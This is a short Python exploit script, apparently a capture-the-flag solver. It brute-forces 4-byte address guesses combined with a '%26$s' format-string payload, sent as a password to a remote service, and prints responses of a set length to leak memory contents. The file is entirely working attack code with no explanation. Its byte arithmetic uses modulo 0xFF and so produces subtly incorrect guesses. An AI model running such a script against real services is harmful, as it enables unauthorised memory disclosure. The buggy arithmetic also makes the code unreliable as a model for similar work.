#! /usr/bin/python3
import tqdm

import connect


def main():
    # Note the value at 26$ and 27$ won't be accessible, but that's ok as that should be the input buffer itself
    for i in tqdm.trange(0, 0xFFFFFFFF + 1, 4):
        guess = bytes((i % 0xFF, (i // 0x100) % 0xFF, (i // 0x10000) % 0xFF, (i // 0x1000000) % 0xFF))
        try:
            out = connect.connect(password=guess + b"%26$s")
        except ConnectionResetError:
            continue
        if len(out.strip()) == 30:
            tqdm.tqdm.write(' '.join((str(guess), str(len(out)), str(out),)))


if __name__ == '__main__':
    main()
